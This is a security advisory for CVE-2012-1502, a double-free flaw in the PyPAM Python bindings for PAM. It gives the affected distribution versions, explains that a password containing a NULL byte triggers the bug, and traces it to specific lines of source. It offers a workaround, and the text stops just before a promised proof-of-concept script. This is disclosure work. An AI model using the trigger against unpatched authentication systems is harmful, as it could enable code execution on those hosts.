PyPAM -- Python bindings for PAM - Double Free Corruption
---------------------------------------------------------

Affected Versions
=================
PyPAM <= 0.4.2
Red Hat PyPAM <= 0.5.0-12
Debian python-pam <= 0.4.2-12.2
Ubuntu python-pam <= 0.4.2-12.2
SUSE python-pam <= 0.5.0-79.1.2
Gentoo pypam <= 0.5.0

Problem Overview
================
Technical Risk: high
Likelihood of Exploit: low to medium
Vendor: Rob Riggs, Various
Discovery: Markus Vervier
Advisory URL: http://www.lsexperts.de/advisories/lse-2012-03-01.txt
Advisory Status: Public
CVE-Number: CVE-2012-1502

Problem Description
===================
While conducting an internal test LSE discovered that by supplying
a password containing a NULL-byte to the PyPAM module, a double-free [1]
condition is triggered. This leads to undefined behaviour and may allow
remote code execution.

Temporary Workaround and Fix
============================
Filtering NULL-bytes in strings before passing them to the PyPAM module
will mitigate the exploit. Also current GLIBC protections may prevent
the double-free condition from being exploitable. It is advised to update
to a fixed version of PyPAM.

Detailed Description
====================
When PyArg_ParseTuple() in line 81 of PAMmodule.c is given a string with
Null-Bytes, a TypeError exception is raised [2]. The security problem is in
line 82 of PAMmodule.c where free() is called on *resp, but *resp is not
set to NULL. On line 95 in libpam's v_prompt.c the _pam_drop macro calls
free on the response again unless (*resp == NULL), which leads to
undefined behaviour.

The following PoC script triggers the problem:
